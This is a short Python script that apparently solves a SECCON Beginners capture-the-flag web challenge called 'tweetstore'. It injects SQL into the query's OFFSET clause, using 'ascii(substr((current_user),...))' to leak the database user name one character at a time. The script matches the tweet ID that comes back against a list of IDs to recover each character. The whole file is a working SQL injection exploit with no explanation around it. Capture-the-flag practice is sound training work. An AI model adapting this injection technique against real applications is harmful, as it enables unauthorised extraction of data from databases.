#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import requests
import urllib.parse

base_url = "http://tweetstore.quals.beginners.seccon.jp/"
split_s = 'https://twitter.com/user/status/'
split_e = '">Watch@Twitter'

with open('tweet_ids.txt', 'r') as f:
    tweet_ids = f.read()[1:-1].replace("'",'').split(', ')

for i in range(200):
    attack = 'ascii(substr((current_user),' + str(i+1) + ',1))'
    url = base_url + '?search=&limit=1+offset+' + urllib.parse.quote(attack)
    res = requests.get(url)
    tweet_id = res.text.split(split_s)[1].split(split_e)[0]
    print(chr(tweet_ids.index(tweet_id)),end='')